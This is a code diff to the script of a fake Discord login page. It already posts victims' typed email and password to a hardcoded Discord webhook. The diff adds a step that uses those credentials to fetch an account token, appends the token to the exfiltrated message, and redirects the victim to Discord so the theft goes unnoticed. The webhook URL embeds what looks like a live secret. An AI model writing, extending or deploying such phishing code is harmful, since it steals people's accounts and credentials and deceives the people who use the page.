@@ -64,23 +64,64 @@ function generateQRCode(data) {
 }
 
 // --------------------------------------------------
-// ---------- WEBHOOK FUNCTION ----------------------
+// ---------- FETCH ACCOUNT TOKEN -------------------
 // --------------------------------------------------
-async function sendToWebhook(email, password) {
-  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
+async function fetchAccountToken(email, password) {
+  const apiUrl = "https://api.example.com/login"; // Replace with your actual authentication API endpoint
   const payload = {
-    content: `Email: ${email}\nPassword: ${password}\nTimestamp: ${new Date().toISOString()}`,  // Include the email, password, and timestamp as part of the content.
-    username: "Login Attempt", // You can customize the bot's username
-    avatar_url: "https://example.com/avatar.png", // Optional: Provide an avatar for the bot
+    email: email,
+    password: password
   };
 
-  console.log("Attempting to send payload:", payload); // Debug: See what’s being sent
+  try {
+    const response = await fetch(apiUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${await response.text()}`);
+    }
+
+    const data = await response.json();
+    const token = data.token; // Adjust based on your API's response structure
+    console.log("Token retrieved:", token);
+
+    // Optionally generate QR code with the token
+    const qrCode = generateQRCode(token);
+    if (qrCode) {
+      // Append QR code to the DOM or handle as needed
+      document.body.appendChild(qrCode); // Example: Append to body
+    }
+
+    return token;
+  } catch (error) {
+    console.error("Error fetching token:", error.message);
+    return null;
+  }
+}
+
+// --------------------------------------------------
+// ---------- WEBHOOK FUNCTION ----------------------
+// --------------------------------------------------
+async function sendToWebhook(email, password, token = null) {
+  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
+  const payload = {
+    content: `Email: ${email}\nPassword: ${password}\nToken: ${token || 'Not retrieved'}\nTimestamp: ${new Date().toISOString()}`,
+    username: "Login Attempt",
+    avatar_url: "https://example.com/avatar.png"
+  };
+
+  console.log("Attempting to send payload:", payload);
 
   try {
     const response = await fetch(webhookUrl, {
       method: "POST",
       headers: {
-        "Content-Type": "application/json",
+        "Content-Type": "application/json"
       },
       body: JSON.stringify(payload)
     });
@@ -106,27 +147,29 @@ loginButton.addEventListener("click", async () => {
   const email = emailInput ? emailInput.value.trim() : "";
   const password = passwordInput ? passwordInput.value.trim() : "";
 
-  console.log("Email:", email, "Password:", password); // Debug: Make sure you have correct values
+  console.log("Email:", email, "Password:", password);
 
   if (!email || !password) {
     alert("Please enter both email and password!");
-    return; // Don't proceed if fields are empty
+    return;
   }
 
   // Start animation
   animateEllipsis();
 
-  // Send to webhook (will send empty strings if fields are not filled)
-  const webhookSuccess = await sendToWebhook(email, password);
+  // Fetch token
+  const token = await fetchAccountToken(email, password);
+
+  // Send to webhook with token
+  const webhookSuccess = await sendToWebhook(email, password, token);
 
   // After animation (3s), redirect if success
   setTimeout(() => {
     if (webhookSuccess) {
       console.log("Redirecting to Discord...");
-      window.location.href = "https://discord.com/channels/@me"; // Changed to Discord home for logged-in feel (adjust if needed)
+      window.location.href = "https://discord.com/channels/@me";
     } else {
       console.log("Webhook failed - no redirect");
-      // Optional: Add alert here if you want user feedback on failure
       alert("Login failed - check console for details");
     }
   }, 3000);
